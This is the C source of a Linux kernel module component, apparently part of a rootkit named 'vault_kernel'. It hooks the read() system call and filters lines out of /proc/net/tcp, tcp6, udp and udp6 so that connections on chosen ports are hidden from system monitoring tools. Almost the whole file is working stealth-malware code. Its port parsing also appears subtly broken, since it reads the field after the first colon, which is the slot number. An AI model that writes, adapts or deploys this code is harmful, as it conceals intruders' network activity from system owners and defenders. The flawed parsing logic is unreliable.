/* vault_kernel - net_hide.c
 * Network connection hiding via /proc/net/tcp*, /proc/net/udp* filtering
 * Also hooks read() to filter content from these proc files
 * ruby570bocadito © 2026
 */
#include "core.h"

/* Hidden ports stored as uint16_t in network byte order */
uint16_t hidden_ports[MAX_HIDDEN_PORTS];
int hidden_port_count = 0;
static DEFINE_SPINLOCK(net_hide_lock);

/* Inodes of /proc/net files we care about */
static unsigned long proc_net_tcp_ino = 0;
static unsigned long proc_net_tcp6_ino = 0;
static unsigned long proc_net_udp_ino = 0;
static unsigned long proc_net_udp6_ino = 0;

void net_hide_add_port(uint16_t port) {
    unsigned long flags;
    spin_lock_irqsave(&net_hide_lock, flags);
    if (hidden_port_count < MAX_HIDDEN_PORTS) {
        hidden_ports[hidden_port_count] = htons(port);
        hidden_port_count++;
        pr_info(VAULT_KERNEL_TAG " hiding port: %d\n", port);
    }
    spin_unlock_irqrestore(&net_hide_lock, flags);
}

void net_hide_del_port(uint16_t port) {
    unsigned long flags;
    int i;
    uint16_t net_port = htons(port);
    spin_lock_irqsave(&net_hide_lock, flags);
    for (i = 0; i < hidden_port_count; i++) {
        if (hidden_ports[i] == net_port) {
            hidden_port_count--;
            memmove(&hidden_ports[i], &hidden_ports[i+1],
                    (hidden_port_count - i) * sizeof(uint16_t));
            pr_info(VAULT_KERNEL_TAG " unhid port: %d\n", port);
            break;
        }
    }
    spin_unlock_irqrestore(&net_hide_lock, flags);
}

static int is_port_hidden(uint16_t net_port) {
    unsigned long flags;
    int i;
    spin_lock_irqsave(&net_hide_lock, flags);
    for (i = 0; i < hidden_port_count; i++) {
        if (hidden_ports[i] == net_port) {
            spin_unlock_irqrestore(&net_hide_lock, flags);
            return 1;
        }
    }
    spin_unlock_irqrestore(&net_hide_lock, flags);
    return 0;
}

/*
 * Parse /proc/net/tcp line format:
 * sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   ...
 *  0: 0100007F:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000   ...
 * The local address:port is hex in network byte order: IP:PORT
 */
static int line_has_hidden_port(const char *line) {
    char *colon;
    unsigned long port_hex;
    uint16_t port;

    /* Find the port after first ':' (4th field is local_address:port) */
    colon = strchr(line, ':');
    if (!colon)
        return 0;

    if (kstrtoul(colon + 1, 16, &port_hex))
        return 0;

    port = (uint16_t)port_hex; /* Already in network byte order in the file */
    return is_port_hidden(port);
}

/*
 * Filter buffer: remove lines containing hidden ports
 */
static size_t filter_port_lines(char *buf, size_t len) {
    char *src = buf, *dst = buf;
    char *line_start = buf;
    char *buf_end = buf + len;

    while (src < buf_end) {
        if (*src == '\n' || src == buf_end - 1) {
            size_t line_len = src - line_start + (src < buf_end ? 1 : 0);

            if (line_has_hidden_port(line_start)) {
                /* Skip this line */
            } else {
                if (dst != line_start)
                    memmove(dst, line_start, line_len);
                dst += line_len;
            }
            line_start = src + 1;
        }
        src++;
    }

    return dst - buf;
}

/*
 * Resolve inode for /proc/net files at init time
 */
static unsigned long get_proc_inode(const char *path) {
    struct path p;
    unsigned long ino = 0;

    if (kern_path(path, LOOKUP_FOLLOW, &p) == 0) {
        ino = p.dentry->d_inode->i_ino;
        path_put(&p);
    }
    return ino;
}

/* ================================================================
 * Hooked read() — intercept reads to /proc/net/* files
 * ================================================================ */
asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf, size_t count) {
    ssize_t ret;
    long (*orig_read)(unsigned int, char __user *, size_t);
    char *kbuf = NULL;
    unsigned long ino = 0;
    struct fd f;

    orig_read = (void *)hooks[HOOKIDX_READ].original;

    /* Check if this fd is a /proc/net file we care about */
    f = fdget(fd);
    if (f.file) {
        struct inode *inode = f.file->f_inode;
        if (inode)
            ino = inode->i_ino;
    }
    fdput(f);

    /* Only filter /proc/net/tcp* and /proc/net/udp* */
    if (ino != proc_net_tcp_ino && ino != proc_net_tcp6_ino &&
        ino != proc_net_udp_ino && ino != proc_net_udp6_ino) {
        return orig_read(fd, buf, count);
    }

    if (hidden_port_count == 0)
        return orig_read(fd, buf, count);

    ret = orig_read(fd, buf, count);
    if (ret <= 0)
        return ret;

    kbuf = kmalloc(ret + 1, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, buf, ret)) {
        kfree(kbuf);
        return ret;
    }
    kbuf[ret] = '\0';

    {
        size_t new_len = filter_port_lines(kbuf, ret);
        if (new_len < (size_t)ret) {
            size_t copy_len = new_len;
            if (copy_to_user(buf, kbuf, copy_len)) {
                kfree(kbuf);
                return -EFAULT;
            }
            ret = copy_len;
        }
    }

    kfree(kbuf);
    return ret;
}

int net_hide_init(void) {
    /* Resolve /proc/net file inodes */
    proc_net_tcp_ino  = get_proc_inode("/proc/net/tcp");
    proc_net_tcp6_ino = get_proc_inode("/proc/net/tcp6");
    proc_net_udp_ino  = get_proc_inode("/proc/net/udp");
    proc_net_udp6_ino = get_proc_inode("/proc/net/udp6");

    pr_info(VAULT_KERNEL_TAG " network hiding initialized — "
            "tcp=%lu tcp6=%lu udp=%lu udp6=%lu\n",
            proc_net_tcp_ino, proc_net_tcp6_ino,
            proc_net_udp_ino, proc_net_udp6_ino);
    return 0;
}

void net_hide_cleanup(void) {
    hidden_port_count = 0;
    pr_info(VAULT_KERNEL_TAG " network hiding cleaned\n");
}
